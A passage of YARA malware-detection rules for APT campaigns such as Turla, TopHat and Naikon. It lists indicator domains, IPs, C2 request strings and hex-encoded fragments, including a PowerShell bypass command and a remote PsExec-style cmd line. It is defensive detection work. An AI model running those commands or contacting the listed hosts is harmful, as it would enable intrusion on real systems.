\"helpdesk.hotmail-onlines.com\"\n        $s18 = \"helpdesk.lnip.org\"\n        $s19 = \"hotmail-onlines.com\"\n        $s20 = \"jobs.hotmail-onlines.com\"\n        $s21 = \"justufogame.com\"\n        $s22 = \"lnip.org\"\n        $s23 = \"local-test.com\"\n        $s24 = \"login.hansoftupdate.com\"\n        $s25 = \"long.update-onlines.org\"\n        $s26 = \"longlong.update-onlines.org\"\n        $s27 = \"longshadow.dyndns.org\"\n        $s28 = \"longshadow.update-onlines.org\"\n        $s29 = \"longykcai.update-onlines.org\"\n        $s30 = \"lostself.update-onlines.org\"\n        $s31 = \"mac.navydocument.com\"\n        $s32 = \"mail.csc-na.com\"\n        $s33 = \"mantech.updatawindows.com\"\n        $s34 = \"micr0soft.org\"\n        $s35 = \"microsoft-outlook.org\"\n        $s36 = \"mtc.navydocument.com\"\n        $s37 = \"navydocument.com\"\n        $s38 = \"mtc.update-onlines.org\"\n        $s39 = \"news.hotmail-onlines.com\"\n        $s40 = \"oac.3322.org\"\n        $s41 = \"ocean.apigmail.com\"\n        $s42 = \"pchomeserver.com\"\n        $s43 = \"registre.organiccrap.com\"\n        $s44 = \"security.pomsys.org\"\n        $s45 = \"services.darkhero.org\"\n        $s46 = \"sgl.updatawindows.com\"\n        $s47 = \"shadow.update-onlines.org\"\n        $s48 = \"sonoco.blackcmd.com\"\n        $s49 = \"test.logmastre.com\"\n        $s50 = \"up.gtalklite.com\"\n        $s51 = \"updatawindows.com\"\n        $s52 = \"update-onlines.org\"\n        $s53 = \"update.deepsoftupdate.com\"\n        $s54 = \"update.hancominc.com\"\n        $s55 = \"update.micr0soft.org\"\n        $s56 = \"update.pchomeserver.com\"\n        $s57 = \"urs.blackcmd.com\"\n        $s58 = \"wang.darkhero.org\"\n        $s59 = \"webs.local-test.com\"\n        $s60 = \"word.apigmail.com\"\n        $s61 = \"wordpress.blackcmd.com\"\n        $s62 = \"working.blackcmd.com\"\n        $s63 = \"working.darkhero.org\"\n        $s64 = \"working.hotmail-onlines.com\"\n        $s65 = \"www.trendmicro-update.org\"\n        $s66 = \"www.update-onlines.org\"\n        $s67 = \"x.apigmail.com\"\n        $s68 = \"ykcai.update-onlines.org\"\n        $s69 = \"ykcailostself.dyndns-free.com\"\n        $s70 = \"ykcainobody.dyndns.org\"\n        $s71 = \"zj.blackcmd.com\"\n        $s72 = \"laxness-lab.com\"\n        $s73 = \"google-ana1ytics.com\"\n        $s74 = \"www.google-ana1ytics.com\"\n        $s75 = \"ftp.google-ana1ytics.com\"\n        $s76 = \"hotmailcontact.net\"\n        $s77 = \"208.115.242.36\"\n        $s78 = \"208.115.242.37\"\n        $s79 = \"208.115.242.38\"\n        $s80 = \"66.63.178.142\"\n        $s81 = \"72.11.148.220\"\n        $s82 = \"72.11.141.133\"\n        $s83 = \"74.63.195.236\"\n        $s84 = \"74.63.195.236\"\n        $s85 = \"74.63.195.237\"\n        $s86 = \"74.63.195.238\"\n        $s87 = \"103.24.0.142\"\n        $s88 = \"103.24.1.54\"\n        $s89 = \"106.187.45.162\"\n        $s90 = \"192.151.236.138\"\n        $s91 = \"192.161.61.19\"\n        $s92 = \"192.161.61.20\"\n        $s93 = \"192.161.61.22\"\n        $s94 = \"103.24.1.54\"\n        $s95 = \"67.215.232.179\"\n        $s96 = \"96.44.177.195\"\n        $s97 = \"49.143.192.221\"\n        $s98 = \"67.215.232.181\"\n        $s99 = \"67.215.232.182\"\n        $s100 = \"96.44.182.243\"\n        $s101 = \"96.44.182.245\"\n        $s102 = \"96.44.182.246\"\n        $s103 = \"49.143.205.30\"\n        $s104 = \"working_success@163.com\"\n        $s105 = \"ykcaihyl@163.com\"\n        $s106 = \"working_success@163.com\"\n        $s107 = \"yuming@yinsibaohu.aliyun.com\"\n\n    condition:\n        uint16(0) == 0x5a4d and 1 of them\n}\n\nrule TopHat_Malware_Jan18_1\n{\n    meta:\n        description = \"Malware from TopHat campaign\"\n        ref = \"https://researchcenter.paloaltonetworks.com/2018/01/unit42-the-tophat-campaign-attacks-within-the-middle-east-region-using-popular-third-party-services/#appendix\"\n        threat_names = \"TopHat\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"TopHat_Malware_Jan18_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"WINMGMTS:\\\\\\\\.\\\\ROOT\\\\CIMV2\" fullword ascii\n        $s2 = \"UENCRYPTION\" fullword ascii\n        $s3 = \"TEXPORTAPIS\" fullword ascii\n        $s4 = \"tcustommemorystream\" fullword ascii\n        $s5 = \"tmemorystream\" fullword ascii\n        $s6 = \"ExtrasNoteCONSOLEemb\" fullword ascii\n        $s7 = \"DIALOG INCLUDE\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 400KB and (pe.imphash() == \"c221006b240b1c993217bd61e5ee31b6\" or 6 of them)\n}\n\nrule Turla_Tavdig_Malformed_Executable\n{\n    meta:\n        description = \"Embedded executable with a malformed header - known from Tavdig malware\"\n        ref = \"https://goo.gl/N5MEj0\"\n        threat_names = \"Turla\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"RUAG_Tavdig_Malformed_Executable\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    condition:\n        uint16(0) == 0x5a4d and uint32(uint32(0x3C)) == 0x0000AD0B\n}\n\nrule Turla_Bot_Config_File\n{\n    meta:\n        description = \"Config file used by malware in RUAG APT case\"\n        ref = \"https://goo.gl/N5MEj0\"\n        threat_names = \"Turla\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"RUAG_Bot_Config_File\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"[CONFIG]\" ascii\n        $s2 = \"name = \" ascii\n        $s3 = \"exe = cmd.exe\" ascii\n\n    condition:\n        $s1 at 0 and $s2 and $s3 and filesize < 160\n}\n\nrule Turla_Cobra_Malware\n{\n    meta:\n        description = \"Malware mentioned in the RUAG Case called Carbon/Cobra\"\n        ref = \"https://goo.gl/N5MEj0\"\n        threat_names = \"Turla\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"RUAG_Cobra_Malware\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"\\\\Cobra\\\\Release\\\\Cobra.pdb\" ascii\n\n    condition:\n        uint16(0) == 0x5a4d and $s1\n}\n\nrule Turla_Cobra_Config_File\n{\n    meta:\n        description = \"Config text file used by malware Cobra in RUAG case\"\n        ref = \"https://goo.gl/N5MEj0\"\n        threat_names = \"Turla\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"RUAG_Cobra_Config_File\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $h1 = \"[NAME]\" ascii\n        $s1 = \"object_id=\" ascii\n        $s2 = \"[TIME]\" ascii fullword\n        $s3 = \"lastconnect\" ascii\n        $s4 = \"[CW_LOCAL]\" ascii fullword\n        $s5 = \"system_pipe\" ascii\n        $s6 = \"user_pipe\" ascii\n        $s7 = \"[TRANSPORT]\" ascii\n        $s8 = \"run_task_system\" ascii\n        $s9 = \"[WORKDATA]\" ascii\n        $s10 = \"address1\" ascii\n\n    condition:\n        $h1 at 0 and 8 of ($s*) and filesize < 5KB\n}\n\nrule Turla_Exfil_Config_File\n{\n    meta:\n        description = \"Config text file used in data exfiltration in RUAG case\"\n        ref = \"https://goo.gl/N5MEj0\"\n        threat_names = \"Turla\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"RUAG_Exfil_Config_File\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $h1 = \"[TRANSPORT]\" ascii\n        $s1 = \"system_pipe\" ascii\n        $s2 = \"spstatus\" ascii\n        $s3 = \"adaptable\" ascii\n        $s4 = \"post_frag\" ascii\n        $s5 = \"pfsgrowperiod\" ascii\n\n    condition:\n        $h1 at 0 and all of ($s*) and filesize < 1KB\n}\n\nrule Turla_Mosquito_Mal_1\n{\n    meta:\n        description = \"Malware sample from Turla Mosquito report\"\n        ref = \"https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf\"\n        threat_names = \"Turla\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"TurlaMosquito_Mal_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Pipetp\" fullword ascii\n        $s2 = \"EStOpnabn\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 2000KB and (pe.imphash() == \"169d4237c79549303cca870592278f42\" or all of them)\n}\n\nrule Turla_Mosquito_Mal_2\n{\n    meta:\n        description = \"Malware sample from Turla Mosquito report\"\n        ref = \"https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf\"\n        threat_names = \"Turla\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"TurlaMosquito_Mal_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \".?AVFileNameParseException@ExecuteFile@@\" fullword ascii\n        $s3 = \"no_address\" fullword wide\n        $s6 = \"SRRRQP\" fullword ascii\n        $s7 = \"QWVPQQ\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 600KB and (pe.imphash() == \"cd918073f209c5da7a16b6c125d73746\" or all of them)\n}\n\nrule Turla_Mosquito_Mal_3\n{\n    meta:\n        description = \"Malware sample from Turla Mosquito report\"\n        ref = \"https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf\"\n        threat_names = \"Turla\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"TurlaMosquito_Mal_3\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"InstructionerDLL.dll\" fullword ascii\n        $s1 = \"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\" fullword wide\n        $s2 = \"/scripts/m/query.php?id=\" fullword wide\n        $s3 = \"SELECT * FROM AntiVirusProduct\" fullword ascii\n        $s4 = \"Microsoft Update\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 400KB and (pe.imphash() == \"88488fe0b8bcd6e379dea6433bb5d7d8\" or (pe.exports(\"InstallRoutineW\") and pe.exports(\"StartRoutine\")) or $x1 or 3 of them)\n}\n\nrule Turla_Mosquito_Mal_4\n{\n    meta:\n        description = \"Malware sample from Turla Mosquito report\"\n        ref = \"https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf\"\n        threat_names = \"Turla\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"TurlaMosquito_Mal_4\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 800KB and pe.imphash() == \"17b328245e2874a76c2f46f9a92c3bad\"\n}\n\nrule Turla_Mosquito_Mal_5\n{\n    meta:\n        description = \"Malware sample from Turla Mosquito report\"\n        ref = \"https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf\"\n        threat_names = \"Turla\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"TurlaMosquito_Mal_5\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 300KB and pe.imphash() == \"ac40cf7479f53a4754ac6481a4f24e57\"\n}\n\nrule Turla_Mosquito_Mal_6\n{\n    meta:\n        description = \"Malware sample from Turla Mosquito report\"\n        ref = \"https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf\"\n        threat_names = \"Turla\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"TurlaMosquito_Mal_6\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $a1 = \"/scripts/m/query.php?id=\" fullword wide\n        $a2 = \"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\" fullword wide\n        $a3 = \"GetUserNameW fails\" fullword wide\n        $s1 = \"QVSWQQ\" fullword ascii\n        $s2 = \"SRRRQP\" fullword ascii\n        $s3 = \"QSVVQQ\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 500KB and (2 of ($a*) or 4 of them)\n}\n\nrule Turla_Mosquito_Mal_7\n{\n    meta:\n        description = \"Malware sample from Turla Mosquito report\"\n        ref = \"https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf\"\n        threat_names = \"Turla\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"TurlaMosquito_Mal_7\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"Logger32.dll\" fullword ascii\n        $s6 = \"lManager::Execute : CPalExceptio\" fullword wide\n        $s19 = \"CCommandSender::operator(\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1000KB and (pe.imphash() == \"073235ae6dfbb1bf5db68a039a7b7726\" or 2 of them)\n}\n\nrule Unit78020_Malware_Gen1\n{\n    meta:\n        description = \"Malware by Chinese APT PLA Unit 78020 - Generic Rule\"\n        ref = \"http://threatconnect.com/camerashy/?utm_campaign=CameraShy\"\n        threat_names = \"PLA 78020, Naikon\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Unit78020_Malware_Gen1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"greensky27.vicp.net\" fullword wide\n        $x2 = \"POST http://%s:%d/aspxabcdefg.asp?%s HTTP/1.1\" fullword ascii\n        $x3 = \"GET http://%s:%d/aspxabcdef.asp?%s HTTP/1.1\" fullword ascii\n        $x4 = \"serch.vicp.net\" fullword wide\n        $x5 = \"greensky27.vicp.net\" fullword wide\n        $x6 = \"greensky27.vicp.net.as\" fullword wide\n        $x7 = \"greensky27.vcip.net\" fullword wide\n        $x8 = \"pnoc-ec.vicp.net\" fullword wide\n        $x9 = \"aseanph.vicp.net\" fullword wide\n        $x10 = \"pnoc.vicp.net\" fullword wide\n        $a1 = \"dMozilla/4.0 (compatible; MSIE 6.0;Windows NT 5.0; .NET CLR 1.1.4322)\" fullword wide\n        $a2 = \"User-Agent: Netscape\" fullword ascii\n        $a3 = \"Accept-Language:En-us/r/n\" fullword wide\n        $a4 = \"\\\\Office Start.lnk\" fullword wide\n        $a5 = \"\\\\MSN Talk Start.lnk\" fullword wide\n        $s1 = \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)\" fullword wide\n        $s2 = \"User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-EN; rv:1.7.12) Gecko/20100719 Firefox/1.0.7\" fullword ascii\n        $s3 = \"%USERPROFILE%\\\\Application Data\\\\Mozilla\\\\Firefox\\\\Profiles\" fullword wide\n        $s4 = \"Content-Type:application/x-www-form-urlencoded/r/n\" fullword wide\n        $s5 = \"Hello World!\" fullword wide\n        $s6 = \"Accept-Encoding:gzip,deflate/r/n\" fullword wide\n        $s7 = \"/%d%s%d\" fullword ascii\n        $s8 = \"%02d-%02d-%02d %02d:%02d\" fullword wide\n        $s9 = \"WininetMM Version 1.0\" fullword wide\n        $s10 = \"WININETMM\" fullword wide\n        $s11 = \"GET %dHTTP/1.1\" fullword ascii\n        $s12 = \"POST http://%ws:%d/%d%s%dHTTP/1.1\" fullword ascii\n        $s13 = \"PeekNamePipe\" fullword ascii\n        $s14 = \"Normal.dot\" fullword ascii\n        $s15 = \"R_eOR_eOR_eO)CiOS_eO\" fullword ascii\n        $s16 = \"DRIVE_RAMDISK\" fullword wide\n        $s17 = \"%s %s %s %s %d %d %d %d \" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 250KB and 1 of ($x*)) or 2 of ($a*) or 6 of ($s*)\n}\n\nrule Unit78020_Malware_1\n{\n    meta:\n        description = \"Malware by Chinese APT PLA Unit 78020 - Specific Rule - msictl.exe\"\n        ref = \"http://threatconnect.com/camerashy/?utm_campaign=CameraShy\"\n        threat_names = \"PLA 78020, Naikon\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Unit78020_Malware_1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"%ProgramFiles%\\\\Internet Explorer\\\\iexplore.exe\" fullword ascii\n        $s2 = \"msictl.exe\" fullword ascii\n        $s3 = \"127.0.0.1:8080\" fullword ascii\n        $s4 = \"mshtml.dat\" fullword ascii\n        $s5 = \"msisvc\" fullword ascii\n        $s6 = \"NOKIAN95/WEB\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 160KB and 4 of them\n}\n\nrule Unit78020_Malware_Gen2\n{\n    meta:\n        description = \"Malware by Chinese APT PLA Unit 78020 - Generic Rule\"\n        ref = \"http://threatconnect.com/camerashy/?utm_campaign=CameraShy\"\n        threat_names = \"PLA 78020, Naikon\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Unit78020_Malware_Gen2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"-GetModuleFileNameExW\" fullword ascii\n        $s1 = \"\\\\MSN Talk Start.lnk\" fullword wide\n        $s2 = \":SeDebugPrivilege\" fullword wide\n        $s3 = \"WinMM Version 1.0\" fullword wide\n        $s4 = \"dwError1 = %d\" fullword ascii\n        $s5 = \"*Can't Get\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1000KB and all of them\n}\n\nrule Unit78020_Malware_Gen3\n{\n    meta:\n        description = \"Malware by Chinese APT PLA Unit 78020 - Generic Rule - Chong\"\n        ref = \"http://threatconnect.com/camerashy/?utm_campaign=CameraShy\"\n        threat_names = \"PLA 78020, Naikon\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Unit78020_Malware_Gen3\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"GET http://%ws:%d/%d%s%dHTTP/1.1\" fullword ascii\n        $x2 = \"POST http://%ws:%d/%d%s%dHTTP/1.1\" fullword ascii\n        $x3 = \"J:\\\\chong\\\\\" ascii\n        $s1 = \"User-Agent: Netscape\" fullword ascii\n        $s2 = \"User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-EN; rv:1.7.12) Gecko/20100719 Firefox/1.0.7\" fullword ascii\n        $s3 = \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\explorer\\\\User Shell Folders\" fullword wide\n        $s4 = \"J:\\\\chong\\\\nod\\\\Release\\\\SslMM.exe\" fullword ascii\n        $s5 = \"MM.exe\" fullword ascii\n        $s6 = \"network.proxy.ssl\" fullword wide\n        $s7 = \"PeekNamePipe\" fullword ascii\n        $s8 = \"Host: %ws:%d\" fullword ascii\n        $s9 = \"GET %dHTTP/1.1\" fullword ascii\n        $s10 = \"SCHANNEL.DLL\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 300KB and 1 of ($x*)) or 4 of ($s*)\n}\n\nrule USCERT_TA17_293A_malware_1\n{\n    meta:\n        description = \"Inveigh pen testing tools & related artifacts\"\n        ref = \"https://www.us-cert.gov/ncas/alerts/TA17-293A\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US-CERT Code Analysis Team (modified by Florian Roth)\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"TA17_293A_malware_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $n1 = \"file://\"\n        $ax1 = \"184.154.150.66\"\n        $ax2 = \"5.153.58.45\"\n        $ax3 = \"62.8.193.206\"\n        $ax4 = \"/pshare1/icon\"\n        $ax5 = \"/ame_icon.png\"\n        $ax6 = \"/1/ree_stat/p\"\n        $s1 = \"(g.charCodeAt(c)^l[(l[b]+l[e])%256])\"\n        $s2 = \"for(b=0;256>b;b++)k[b]=b;for(b=0;256>b;b++)\"\n        $s3 = \"VXNESWJfSjY3grKEkEkRuZeSvkE=\"\n        $s4 = \"NlZzSZk=\"\n        $s5 = \"WlJTb1q5kaxqZaRnser3sw==\"\n        $x1 = { 87D081F60C67F5086A003315D49A4000F7D6E8EB12000081F7F01BDD21F7DE }\n        $x2 = { 33C42BCB333DC0AD400043C1C61A33C3F7DE33F042C705B5AC400026AF2102 }\n        $x3 = \"fromCharCode(d.charCodeAt(e)^k[(k[b]+k[h])%256])\"\n        $x4 = \"ps.exe -accepteula \\\\%ws% -u %user% -p %pass% -s cmd /c netstat\"\n        $x5 = { 22546F6B656E733D312064656C696D733D5C5C222025254920494E20286C6973742E74787429 }\n        $x6 = { 68656C6C2E657865202D6E6F65786974202D657865637574696F6E706F6C69637920627970617373202D636F6D6D616E6420222E202E5C496E76656967682E70 }\n        $x7 = { 476F206275696C642049443A202266626433373937623163313465306531 }\n        $x8 = { 24696E76656967682E7374617475735F71756575652E4164642822507265737320616E79206B657920746F2073746F70207265616C2074696D65 }\n        $x9 = { 2F73657474696E67732E786D6CB456616FDB3613FEFE02EF7F10F4798E64C54D06A14ED125F19A225E87C9FD0194485B }\n        $x10 = { 6C732F73657474696E67732E786D6C2E72656C7355540500010076A41275780B0001040000000004000000008D90B94E03311086EBF014D6F4D87B48214471D2 }\n        $x11 = { 8D90B94E03311086EBF014D6F4D87B48214471D210A41450A0E50146EBD943F8923D41C9DBE3A54A240ACA394A240ACA39 }\n        $x12 = { 8C90CD4EEB301085D7BD4F61CDFEDA092150A1BADD005217B040E10146F124B1F09FEC01B56F8FC3AA9558B0B4 }\n        $x13 = { 8C90CD4EEB301085D7BD4F61CDFEDA092150A1BADD005217B040E10146F124B1F09FEC01B56F8FC3AA9558B0B4 }\n        $x14 = \"http://bit.ly/2m0x8IH\"\n\n    condition:\n        ($n1 and 1 of ($ax*)) or 2 of ($s*) or 1 of ($x*)\n}\n\nrule USCERT_TA17_293A_malware_2\n{\n    meta:\n        description = \"Malware mentioned in TA17-293A\"\n        ref = \"https://www.us-cert.gov/ncas/alerts/TA17-293A\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"other\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"TA17_293A_malware_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $api_hash = { 8A 08 84 C9 74 0D 80 C9 60 01 CB C1 E3 01 03 45 10 EB ED }\n        $http_push = \"X-mode: push\" nocase\n        $http_pop = \"X-mode: pop\" nocase\n\n    condition:\n        any of them\n}\n\nrule USCERT_Imphash_UPX_Packed_Malware_1_TA17_293A\n{\n    meta:\n        description = \"Malware mentioned in TA17-293A\"\n        ref = \"https://www.us-cert.gov/ncas/alerts/TA17-293A\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Imphash_UPX_Packed_Malware_1_TA17_293A\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 5000KB and pe.imphash() == \"d7d745ea39c8c5b82d5e153d3313096c\")\n}\n\nrule USCERT_Query_XML_Code_MAL_DOC_PT_2\n{\n    meta:\n        description = \"Malware mentioned in TA18-074A\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"other\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Query_XML_Code_MAL_DOC_PT_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $dir1 = \"word/_rels/settings.xml.rels\"\n        $bytes = {8c 90 cd 4e eb 30 10 85 d7}\n\n    condition:\n        uint32(0) == 0x04034b50 and $dir1 and $bytes\n}\n\nrule USCERT_Query_Javascript_Decode_Function\n{\n    meta:\n        description = \"Malware mentioned in TA18-074A\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"other\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Query_Javascript_Decode_Function\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $decode1 = {72 65 70 6C 61 63 65 28 2F 5B 5E 41 2D 5A 61 2D 7A 30 2D 39 5C 2B 5C 2F 5C 3D 5D 2F 67 2C 22 22 29 3B}\n        $decode2 = {22 41 42 43 44 45 46 47 48 49 4A 4B 4C 4D 4E 4F 50 51 52 53 54 55 56 57 58 59 5A 61 62 63 64 65 66 67 68 69 6A 6B 6C 6D 6E 6F 70 71 72 73 74 75 76 77 78 79 7A 30 31 32 33 34 35 36 37 38 39 2B 2F 3D 22 2E 69 6E 64 65 78 4F 66 28 ?? 2E 63 68 61 72 41 74 28 ?? 2B 2B 29 29}\n        $decode3 = {3D ?? 3C 3C 32 7C ?? 3E 3E 34 2C ?? 3D 28 ?? 26 31 35 29 3C 3C 34 7C ?? 3E 3E 32 2C ?? 3D 28 ?? 26 33 29 3C 3C 36 7C ?? 2C ?? 2B 3D [1-2] 53 74 72 69 6E 67 2E 66 72 6F 6D 43 68 61 72 43 6F 64 65 28 ?? 29 2C 36 34 21 3D ?? 26 26 28 ?? 2B 3D 53 74 72 69 6E 67 2E 66 72 6F 6D 43 68 61 72 43 6F 64 65 28 ?? 29}\n        $decode4 = {73 75 62 73 74 72 69 6E 67 28 34 2C ?? 2E 6C 65 6E 67 74 68 29}\n\n    condition:\n        filesize < 20KB and all of 